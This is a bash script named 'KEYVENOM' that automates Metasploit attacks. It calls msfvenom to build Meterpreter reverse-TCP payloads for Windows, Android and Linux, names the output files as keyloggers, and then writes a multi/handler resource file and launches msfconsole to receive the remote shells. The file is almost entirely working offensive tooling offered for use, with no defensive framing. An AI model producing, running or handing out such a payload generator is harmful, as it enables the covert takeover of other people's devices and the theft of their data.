#!/bin/bash

OUTPUT_DIR="payloads/output"
LISTENER_DIR="listener"

mkdir -p $OUTPUT_DIR
mkdir -p $LISTENER_DIR

# Function to display the banner in BIG ASCII using figlet
show_banner() {
  clear
  if ! command -v figlet &> /dev/null; then
    echo "[!] figlet not found. Installing..."
    sudo apt install figlet -y
  fi
  figlet -c "KEYVENOM"
  echo "        Automated Payload Generator"
  echo "        ----------------------------"
}

# Launch a new terminal window and run the actual script there
if [ -z "$IN_KEYVENOM_WINDOW" ]; then
  echo "[*] Launching KEYVENOM in new terminal window..."
  gnome-terminal -- bash -c "export IN_KEYVENOM_WINDOW=1; bash '$0'" &>/dev/null
  exit 0
fi

# We're now inside the new terminal
show_banner
echo
echo "1. Create Windows Payload (.exe)"
echo "2. Create Android Payload (.apk)"
echo "3. Create Linux Payload (.elf)"
echo "4. Jump to Listener Only"
echo "5. Exit"
echo "----------------------------------"
read -p "Select option: " choice

if [[ "$choice" -eq 5 ]]; then
  echo "[*] Exiting..."
  exit
fi

read -p "Enter LHOST (Your IP): " LHOST
read -p "Enter LPORT (Port to listen on): " LPORT

# Select payload type
case $choice in
  1)
    PAYLOAD="windows/x64/meterpreter/reverse_tcp"
    OUTPUT="$OUTPUT_DIR/keylogger-win.exe"
    FORMAT="exe"
    ;;
  2)
    PAYLOAD="android/meterpreter/reverse_tcp"
    OUTPUT="$OUTPUT_DIR/keylogger-android.apk"
    FORMAT="raw"
    ;;
  3)
    PAYLOAD="linux/x86/meterpreter/reverse_tcp"
    OUTPUT="$OUTPUT_DIR/keylogger-linux.elf"
    FORMAT="elf"
    ;;
  4)
    echo "Select Payload for Listener:"
    echo "1. Windows"
    echo "2. Android"
    echo "3. Linux"
    read -p "Payload type: " ptype
    case $ptype in
      1) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
      2) PAYLOAD="android/meterpreter/reverse_tcp" ;;
      3) PAYLOAD="linux/x86/meterpreter/reverse_tcp" ;;
      *) echo "Invalid option."; exit ;;
    esac
    ;;
  *)
    echo "Invalid option!"
    exit
    ;;
esac

# Payload creation
if [[ "$choice" -ne 4 ]]; then
  echo "[*] Generating payload using msfvenom..."
  msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT -o $OUTPUT
  echo "[✔] Payload saved to $OUTPUT"
fi

# Create Metasploit resource script (no exploit command)
RCFILE="$LISTENER_DIR/msf_listener.rc"
cat > $RCFILE <<EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession true
# MANUAL STEP: Type 'exploit' in msfconsole
EOF

echo "[*] Launching Metasploit... You must type 'exploit' manually."
msfconsole -r $RCFILE
